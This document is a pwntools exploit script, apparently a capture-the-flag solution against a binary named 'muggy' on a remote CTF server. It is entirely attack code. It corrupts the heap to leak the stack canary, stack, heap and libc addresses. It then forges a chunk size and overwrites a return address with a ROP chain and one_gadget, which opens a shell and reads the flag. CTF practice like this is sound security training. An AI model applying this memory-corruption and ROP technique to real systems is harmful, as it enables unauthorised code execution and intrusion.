#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'muggy')

def start(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)


# io = start()
io = remote('pwn.ozon-ctf-2025.ru', 1773)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'A'*0x30)
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'A'*0x30)
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'B'*0x30)
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'C'*0x30)
io.sendlineafter(b'> ', b'4')
io.sendlineafter(b': ', b'3')

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', b'0')
io.sendlineafter(b': ', b'C'*0x62)

io.sendlineafter(b'> ', b'7')
io.sendlineafter(b': ', b'3')
io.sendlineafter(b'> ', b'8')
# # pause()
io.sendline(b'0')
io.recvuntil(b'Xored name: ')
a = io.recvline()[12:-1]
xored_a = bytes([b ^ 0x43 for b in a])
xored_chunks = [int(xored_a[i:i+8][::-1].hex(), 16) for i in range(0, len(xored_a), 8)]
print([hex(i) for i in xored_chunks])

canary = xored_chunks[0]
stack = xored_chunks[3]
heap = xored_chunks[-2]

print(hex(stack))
print(hex(heap))
print(hex(canary))

io.sendline(b'7')
io.sendline(b'2')

for i in range(0x61, 0x38, -1):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', b'0')
    io.sendlineafter(b': ', b'C'*i)

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', b'0')
io.sendlineafter(b': ', b'C'*0x38+p64(0x000000000000e921))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'D'*0x30)
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'a')
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'a')
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'a')
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'a')
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'a')
io.sendlineafter(b'> ', b'4')
io.sendlineafter(b': ', b'5')
io.sendlineafter(b'> ', b'7')
io.sendlineafter(b': ', b'5')
io.sendlineafter(b'> ', b'4')
io.sendlineafter(b': ', b'6')
io.sendlineafter(b'> ', b'7')
io.sendlineafter(b': ', b'5')

io.sendlineafter(b'> ', b'4')
io.sendlineafter(b': ', b'5')
io.sendlineafter(b'> ', b'7')
io.sendlineafter(b': ', b'5')
# print(p64(stack^(heap>>12)))
io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', b'1')
io.sendlineafter(b': ', b'A'*0x10+ p64((stack+8)))

io.sendlineafter(b'> ', b'6')
io.recvline()
io.recvline()
io.recvuntil(b'(')
libc = int(io.recvline()[:-2][::-1].hex(), 16) - 0x2a1ca
print(hex(libc))

pop_rcx = 0x00000000000a877e + libc
pop_rbx = 0x00000000000586e4 + libc
one_gadget = 0x583f3 + libc
# 8 + 8 + 8 + 8 + 8
io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', b'2')
io.sendlineafter(b': ', b'x' * 8 * 4 + p64(one_gadget))
for i in range(15, -1, -1):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', b'x' * 8 * 2 + b'x'*i)
io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', b'2')
io.sendlineafter(b': ', b'x' * 8 * 2 + p64(pop_rbx))
for i in range(15, -1, -1):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', b'x'*i)

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', b'2')
io.sendlineafter(b': ', p64(pop_rcx))
io.sendlineafter(b'> ', b'0')

io.sendline(b"cat flag")
io.interactive()

